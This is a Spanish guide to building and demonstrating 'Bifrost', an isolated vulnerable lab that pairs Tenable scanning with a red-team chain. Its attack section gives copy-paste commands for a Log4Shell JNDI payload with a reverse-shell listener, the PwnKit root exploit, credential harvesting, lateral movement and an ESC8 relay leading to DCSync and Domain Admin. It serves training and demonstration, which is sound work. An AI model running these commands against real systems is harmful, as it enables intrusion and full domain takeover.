# Bifrost — Guía maestra

> **Del hallazgo al dominio.** El escáner no explota, *prioriza*. El red team no
> adivina, *valida*. Bifrost es el puente entre lo que Tenable reporta y lo que
> realmente se puede ejecutar.

Esta es **la única guía**: cubre el diseño, la construcción paso a paso y la
explotación, en orden. Los valores (IPs, dominio, puertos, credenciales) viven en
[config/lab.env](config/lab.env) y no se repiten aquí salvo como referencia.

---

## 1. Qué construyes

| Host | Sistema | Rol en la cadena | IP (default) |
|---|---|---|---|
| **host** | ParrotOS (tu PC) | **atacante + control** | `BIFROST_IP_ATTACKER` · `.66` |
| `scanner` | Ubuntu + Nessus | escáner enlazado a Tenable One | `.10` |
| `web01` | Ubuntu 20.04 | Solr (Log4Shell) + PwnKit + credenciales | `.20` |
| `dc01` | Windows Server 2019 | AD DS + ADCS → ESC8 | `.30` |
| `ws01` | Windows 10 | credenciales señuelo | `.31` |

**El atacante eres tú, desde el host** a través de la interfaz host-only (VMnet1).
No hay máquina Kali: simplifica la implementación y evita la fricción de Kali en
VMware.

### La cadena (4 puentes, 3 máquinas objetivo)

1. **Log4Shell** → shell como `solr` en `web01`.
2. **Privesc** → credenciales de `svc_app` en la config del core → `su svc_app` → **PwnKit** → `root` en `web01`.
3. **Lateral** → credenciales de dominio `svc_backup` en `/opt/app/config.yml` → acceso a `ws01`.
4. **ESC8** → relay NTLM a ADCS → certificado de `dc01$` → DCSync → **Domain Admin**.

---

### Direccionamiento, gateway y DNS

Red **host-only** `10.10.0.0/24`: sin router ni salida a internet.

| Máquina | IP | Gateway | DNS |
|---|---|---|---|
| host (atacante) | `10.10.0.66` | **ninguno** | sin cambios (usa su DNS normal) |
| scanner | `10.10.0.10` | ninguno (la NIC NAT da el suyo por DHCP) | `10.10.0.30` (opcional) |
| web01 | `10.10.0.20` | **ninguno** | `10.10.0.30` (dc01) |
| dc01 | `10.10.0.30` | ninguno | `127.0.0.1` (él mismo) |
| ws01 | `10.10.0.31` | ninguno | `10.10.0.30` (dc01) |

**Claves para no confundirte:**

- **Gateway = ninguno.** Es una red aislada: nada rutea hacia fuera, así que no
  hace falta default gateway. En Linux (netplan) se omite el bloque `routes`; en
  Windows, `New-NetIPAddress` acepta IP sin gateway. Si algún campo lo exige,
  pon `10.10.0.1`: es un valor nominal, no rutea nada.
- **La IP del atacante NO tiene que ser `.1`.** El `.1` es solo la convención con
  la que VMware asigna el adaptador del host (VMnet1). En host-only el host puede
  estar en cualquier IP libre del segmento (aquí `.66`). Solo evita chocar con
  `.10/.20/.30/.31`.
- **DNS**: `dc01` es el DNS del dominio. `ws01` y `web01` apuntan a él; `dc01`
  apunta a sí mismo (`127.0.0.1`). El host y el scanner no lo necesitan en VMnet1
  (el scanner obtiene el suyo por la NIC NAT).

---

## 2. Requisitos

| Requisito | Mínimo | Recomendado |
|---|---|---|
| Hipervisor | VMware Workstation Pro 17.x (Linux/Windows) | ídem |
| Host atacante | ParrotOS (o cualquier Debian con las herramientas) | ParrotOS |
| Red host-only | un adaptador `vmnet` | ídem |
| RAM | 14 GB | 32 GB |
| Disco | 60 GB | 120 GB |
| Python | 3.8 + `requests` | 3.10+ |

> **Fusion 13.x en Mac Intel** también sirve, pero **Apple Silicon no puede correr
> `dc01`/`ws01`** (son x86). En Windows, excluye la carpeta de VMs del antivirus.

---

## 3. Valores y configuración

`config/lab.env` es la **única fuente de verdad**. La leen `bifrost.sh`/`bifrost.ps1`,
`provision/*.sh`, `exploits/*/*.sh`, `tenable_scan.py` y `windows/*.ps1`.

```bash
# ver los valores efectivos (secretos enmascarados)
./bifrost.sh config                  # Linux/macOS
.\bifrost.ps1 config                 # Windows
python tenable/tenable_scan.py --action config
```

Verificación del contrato (sin valores duplicados, motores alineados):

```bash
bash tests/check-consistency.sh
```

Catálogo completo de claves en el **apéndice A**.

---

## 4. Paso a paso (secuencial)

Cada paso termina en un **gate**: no avances si falla.

### Paso 0 — Preparar el host

**En:** `host` (ParrotOS).

1. **Red host-only**: en VMware, crea `VMnet1` host-only, subred = `BIFROST_NETWORK/PREFIX`, sin DHCP.
2. Asigna a tu interfaz host-only la IP del atacante:

```bash
sudo ip addr add 10.10.0.66/24 dev vmnet1   # ajusta interfaz e IP a config/lab.env
ip -br a | grep 10.10.0.66                   # confirma
```

3. Preflight y contrato:

```bash
./bifrost.sh preflight
bash tests/check-consistency.sh
```

4. Herramientas del atacante:

```bash
bash provision/attacker-tools.sh
```

**Gate 0:** `entorno listo` + `contrato de estandarizacion OK`.

### Paso 1 — scanner

**En:** `VMware GUI` + `scanner` + `Tenable UI`.

1. Crea la VM (2 NIC: VMnet1 = `.10` + NAT para enlazar a la nube). Esta NAT **se queda**.
2. Despliega Nessus (OVA oficial) o Ubuntu + `dpkg -i Nessus-*.deb`.
3. En **Tenable One**: *Settings → Scanners → Add Scanner → Nessus Scanner* → copia la **Linking Key**.
4. En la consola del scanner:

```bash
sudo nessuscli managed link --key=<KEY> --cloud
```

5. Política: *Policies → New Policy → Basic Network Scan*, nombre **`Bifrost-Demo`**, con **Credentials** SSH (`bifrost` + sudo) y Windows (`CORP\Administrator`, SMB + WMI), y Plugins → Web Servers activado.
6. API keys: *Settings → My Account → API Keys → Generate*, guárdalas en `~/.bifrost/tenable.json`.

**Gate 1** (en `host`):

```bash
python tenable/tenable_scan.py --action scanners     # status=connected
python tenable/tenable_scan.py --action policies     # existe Bifrost-Demo
```

### Paso 2 — web01

**En:** `VMware GUI` (crear) + consola de `web01` (instalar) + `host` (provisionar).

1. VM Ubuntu Server **20.04** (importante: es la versión con `policykit 0.105`), 2 vCPU / 3 GB / 20 GB, red VMnet1, **NIC NAT activa solo para construir**.
2. Instala con usuario `bifrost` + OpenSSH y `open-vm-tools`. IP estática por netplan (sin gateway, DNS = dc01):

```yaml
# /etc/netplan/00-bifrost.yaml   (cambia ens33 por tu interfaz real: 'ip -br a')
network:
  version: 2
  ethernets:
    ens33:
      dhcp4: false
      addresses: [10.10.0.20/24]
      nameservers:
        addresses: [10.10.0.30]   # dc01
```

```bash
sudo chmod 600 /etc/netplan/00-bifrost.yaml && sudo netplan apply
```

La NIC NAT (segunda interfaz) se configura sola por DHCP y es la que da internet
durante la construcción.
3. Provisiona desde el host:

```bash
bash provision/apply.sh web01
```

**Gate 2** (en `host`):

```bash
curl -s "http://10.10.0.20:8983/solr/admin/info/system?wt=json" | head -c 300
# debe contener "solr-spec-version":"8.11.0"
```

**Gate 3 — cadena Log4Shell completa** (en `host`):

```bash
cd exploits/log4shell && ./build.sh && ./selftest.sh
# RESULTADO: cadena completa OK
```

### Paso 3 — dc01

**En:** `VMware GUI` (crear) + consola de `dc01` (PowerShell admin).

1. VM Windows Server 2019, red VMnet1, 60 GB. Instala VMware Tools.
2. Copia `config\` y `windows\` a `C:\Bifrost\`.
3. Dos pasadas (reiniciando):

```powershell
.\dc01-promote.ps1    # fase 1 -> reinicia
.\dc01-promote.ps1    # fase 2
.\adcs-esc8.ps1       # ADCS con ESC8
```

**Gate 4** (en `dc01`):

```powershell
Get-ADDomain | Select-Object Name                    # corp.local
Invoke-WebRequest http://localhost/certsrv/ -UseBasicParsing
# 401 = correcto: existe, pide NTLM, NO exige TLS
```

### Paso 4 — ws01

**En:** `VMware GUI` + consola de `ws01`.

1. VM Windows 10, red VMnet1, DNS = `BIFROST_IP_DC`.
2. Copia `config\` y `windows\` a `C:\Bifrost\` y ejecuta:

```powershell
.\ws01-join.ps1     # reinicia y relanzar si pide union
```

**Gate 5** (en `ws01`, luego `host`):

```powershell
(Get-CimInstance Win32_ComputerSystem).Domain    # corp.local
```

```bash
# en el host
source ~/bifrost/env.sh
nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --shares
```

### Paso 5 — Prueba de humo del escaneo

**En:** `host`.

```bash
python tenable/tenable_scan.py --action run --name "Bifrost smoke" --out out/smoke.nessus
```

**Gate 6:** termina `completed` y `out/smoke.md` tiene un **Crítico** en `BIFROST_IP_WEB` (Log4Shell).

### Paso 6 — Snapshots y ensayo

1. **Retira la NIC NAT** de `web01` (en `VMware GUI`).
2. Snapshots (en `host`):

```bash
./bifrost.sh snapshot all clean
./bifrost.sh snapshot all pre-demo
```

**Gate final:** `./bifrost.sh reset all` deja todo idéntico a `pre-demo` en <60 s.

---

## 5. La cadena de ataque (comandos copy/paste)

Todo desde el **host atacante**. Antes: `source ~/bifrost/env.sh`.

### Puente 1 — Log4Shell

```bash
# terminal 1: payload + servidor LDAP
cd exploits/log4shell
./build.sh
./ldap-serve.sh

# terminal 2: listener
nc -lvnp "$BIFROST_REVSHELL_PORT"

# terminal 3: el disparo
curl "http://$TARGET_WEB:$BIFROST_SOLR_PORT/solr/admin/cores?action=\${jndi:ldap://$LHOST:$BIFROST_LDAP_PORT/Exploit}"
```

En la shell recibida (usuario `solr` en `web01`): `id`, `hostname`.

### Puente 2 — Privesc (PwnKit)

En la shell de `web01`:

```bash
cat /opt/solr/server/solr/intranet/conf/db.properties    # -> svc_app / password
su svc_app                                               # usa esa password
# PwnKit
git clone https://github.com/berdav/CVE-2021-4034 /tmp/pk && cd /tmp/pk && make && ./cve-2021-4034
id                                                       # uid=0(root)
```

### Puente 3 — Lateral (ws01)

En la shell de `web01` (o con lo que leíste):

```bash
cat /opt/app/config.yml                                  # -> svc_backup / Verano2024!
```

De vuelta en el **host**:

```bash
nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --shares
nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --lsa
evil-winrm -i "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"   # si hay admin local
```

### Puente 4 — ESC8 → Domain Admin

```bash
# terminal 1: relay
ntlmrelayx.py -t "http://$TARGET_DC/certsrv/certfnsh.asp" \
  -smb2support --adcs --template DomainController --output-folder ~/bifrost/loot

# terminal 2: coaccion
PetitPotam.py -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" -d "$BIFROST_DOMAIN" "$LHOST" "$TARGET_DC"

# terminal 3: certificado -> hash
certipy auth -pfx ~/bifrost/loot/DC01.pfx -dc-ip "$TARGET_DC"

# DCSync
secretsdump.py -just-dc-user krbtgt "$BIFROST_DOMAIN/DC01\$"@"$TARGET_DC" -hashes :<HASH>

# impacto
psexec.py -k -no-pass "$BIFROST_DOMAIN/Administrator@$TARGET_DC"
dir C:\Corp\Finanzas
```

---

## 6. El directo (30 min)

| Min | Qué pasa | Quién / dónde |
|---|---|---|
| 00:00 | Hook + slide de arquitectura | tú (`host`) |
| 03:00 | Política, credenciales, triage VPR, Attack Path | Tenable (`Tenable UI`) |
| 08:00 | **Puente 1** Log4Shell | tú (`host`) |
| 12:00 | **Puente 2** privesc | tú (`host`) |
| 15:00 | **Puente 3** lateral | tú (`host`) |
| 19:00 | **Puente 4** ESC8 → DA | tú (`host`) |
| 24:00 | Impacto controlado (leer, no cifrar) | tú (`host`) |
| 26:00 | Blue team: 4624/4625, 4768/4769, 4886/4887, 4662 | Tenable (`Tenable UI`) |
| 29:00 | Cierre | ambos |

**Lanza el escaneo antes de entrar a la sala** (20 min).

---

## 7. Contingencias

| Qué falla | Qué haces |
|---|---|
| Una VM no arranca | `./bifrost.sh reset <vm>` |
| El escaneo tarda | muestra el `.nessus` pre-exportado |
| Puente 1: LDAP no devuelve shell | `selftest.sh`; si falla, clip grabado |
| Puente 2: PwnKit parcheado | usa `sudo -l` si hay misconfig, o clip |
| Puente 3: sin sesión en ws01 | cuéntalo con el diagrama y pasa al 4 |
| Puente 4: relay no recibe | repite la coacción; si falla, clip |
| ZeroLogon deja el DC roto | snapshot + `reset all` |

**Frase comodín:** *"esto es exactamente lo que pasa en producción: el exploit no
siempre funciona a la primera. Se cambia de técnica y se sigue."*

---

## 8. Troubleshooting

| Dónde | Síntoma | Causa probable | Arreglo |
|---|---|---|---|
| `host` | preflight `bloqueante` por red | no hay vmnet | crear VMnet1 host-only |
| `host` | `apply.sh` no conecta | VM apagada / IP mal | `./bifrost.sh ip web01` |
| `web01` | `web01-solr.sh` "sin internet" | falta NIC NAT de construcción | activarla, reejecutar |
| `host` | `selftest.sh` FALLO | trustURLCodebase o ruta | el script imprime 4 pasos |
| `scanner` | `disconnected` | NIC NAT del scanner caída | `curl https://cloud.tenable.com` |
| `host` | escaneo sin Crítico | política sin credenciales/plugins | revisar política |
| `host` | relay no recibe | `certsrv` redirige a HTTPS | repetir `adcs-esc8.ps1` §4 |
| `dc01`/`ws01` | Kerberos falla | reloj desincronizado | `w32tm /resync` |

---

## Apéndice A — Catálogo de valores

Claves de `config/lab.env`. Cambia ahí y en ningún otro sitio.

| Clave | Default | Uso |
|---|---|---|
| `BIFROST_VERSION` | `1.1.0` | informativo |
| `BIFROST_NETWORK` / `BIFROST_PREFIX` / `BIFROST_GATEWAY` | `10.10.0.0` / `24` / `.1` (nominal) | red aislada |
| `BIFROST_IP_ATTACKER` | `.66` | host atacante (VMnet1) |
| `BIFROST_IP_SCANNER` | `.10` | Nessus |
| `BIFROST_IP_WEB` | `.20` | web01 |
| `BIFROST_IP_DC` | `.30` | dc01 |
| `BIFROST_IP_WS` | `.31` | ws01 |
| `BIFROST_DOMAIN` / `BIFROST_NETBIOS` | `corp.local` / `CORP` | dominio |
| `BIFROST_DOMAIN_ADMIN` / `_PASS` | `Administrator` / `Bifrost-Admin-2026!` | union al dominio |
| `BIFROST_DSRM_PASS` | `Bifrost-DSRM-2026!` | modo restauracion |
| `BIFROST_SVC_USER` / `_PASS` | `svc_backup` / `Verano2024!` | puente 3 y 4 |
| `BIFROST_APP_USER` / `_PASS` | `svc_app` / `Bifrost2026!` | usuario local web01 |
| `BIFROST_SOLR_PORT` / `BIFROST_SOLR_VERSION` | `8983` / `8.11.0` | puente 1 |
| `BIFROST_LDAP_PORT` / `HTTP_PORT` / `REVSHELL_PORT` / `PROBE_PORT` | `1389` / `8000` / `4444` / `9998` | exploits |
| `BIFROST_VM_DIR` | `./vms` | carpeta de VMs |
| `BIFROST_SNAPSHOT` | `pre-demo` | snapshot de ensayo |
| `BIFROST_TENABLE_POLICY` | `Bifrost-Demo` | política de escaneo |
| `BIFROST_TENABLE_BASE_URL` / `_KEYS_FILE` | `cloud.tenable.com` / vacío | API |
| `BIFROST_CROWN_JEWEL` | `C:\Corp\Finanzas` | joya de la corona |
| `BIFROST_SHARE_PATH` | `C:\Compartido` | share de ws01 |

> Credenciales de la API de Tenable **no** van en `lab.env`: viven en
> `~/.bifrost/tenable.json` (fuera del repo).
